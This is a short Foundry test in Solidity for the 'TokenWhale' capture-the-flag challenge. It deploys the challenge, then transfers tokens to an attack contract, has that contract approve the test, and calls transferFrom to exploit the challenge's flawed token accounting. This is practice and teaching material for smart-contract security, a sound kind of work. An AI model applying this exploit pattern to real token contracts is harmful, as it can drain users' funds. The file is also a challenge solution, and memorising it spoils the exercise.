// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test } from "forge-std/Test.sol";
import { TokenWhaleChallengeFactory } from "../src/challenges/11_TokenWhale/TokenWhaleChallengeFactory.sol";
import { TokenWhaleAttack } from "../src/attacks/TokenWhaleAttack.sol";

interface ITokenWhaleChallenge {
    function isComplete() external returns (bool);

    function transfer(address to, uint256 value) external;

    function transferFrom(address from, address to, uint256 value) external;
}

contract TokenWhaleTest is Test {
    ITokenWhaleChallenge challenge;

    function setUp() public {
        TokenWhaleChallengeFactory factory = new TokenWhaleChallengeFactory();
        address challengeAddress = factory.createChallenge(address(this));
        challenge = ITokenWhaleChallenge(challengeAddress);
    }

    function test() public {
        TokenWhaleAttack attacker = new TokenWhaleAttack();
        challenge.transfer(address(attacker), 1000);
        attacker.approve(address(challenge), address(this), 1);
        challenge.transferFrom(address(attacker), address(challenge), 1);

        assertTrue(challenge.isComplete());
    }
}